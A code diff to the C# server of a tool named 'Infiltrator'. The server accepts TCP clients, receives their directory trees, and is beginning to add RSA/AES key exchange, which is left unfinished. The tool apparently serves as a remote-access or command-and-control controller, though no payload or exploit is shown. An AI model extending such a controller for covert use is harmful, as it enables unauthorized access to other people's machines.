@@ -2,7 +2,9 @@
 using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography;
+using System.Security.Policy;
 using System.Text;
+using Server.Crypto;
 using Server.Log;
 using static System.Net.Mime.MediaTypeNames;
 
@@ -15,6 +17,7 @@ namespace Server.Conexion
 
         private static TcpListener _listener;
         private static Dictionary<int, TcpClient> _clients = new Dictionary<int, TcpClient>();
+        private static Dictionary<int, byte[]> _aesKeys = new Dictionary<int, byte[]>();
         private static int _clientIdCounter = 0;
         private static bool _isRunning;
         private static bool _waitingForResponse = false;
@@ -24,7 +27,8 @@ namespace Server.Conexion
         public static bool serverStatus() => _isRunning;
         public static bool isWaiting() => _waitingForResponse;
 
-   
+
+        
   
 
 
@@ -98,7 +102,9 @@ namespace Server.Conexion
                     {
                         _clients.Add(clientId, client);
                     }
-                    
+
+                    //Protocol.Send(client.GetStream(), Channel.KeyExchange, Encoding.UTF8.GetBytes(RSAHelper.PublicKey));
+
                     _logger.Log($"Cliente {clientId} conectado.", LogLevel.INFO);
                     Thread clientThread = new Thread(() => HandleClient(client, clientId));
                     clientThread.Start();
@@ -122,7 +128,9 @@ namespace Server.Conexion
             _listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
             _listener.Start();
             _logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}", LogLevel.INFO);
-                
+
+            // Al iniciar el cliente
+            
 
             Thread acceptClientsThread = new Thread(AcceptClients);
             acceptClientsThread.Start();
@@ -285,6 +293,9 @@ namespace Server.Conexion
 
                                 FileTree.UpdateDirectoryTree(Encoding.UTF8.GetString(payload), clientId);
                                 break;
+
+                            case Channel.KeyExchange:
+                          
 
                             case Channel.Main:
                                 
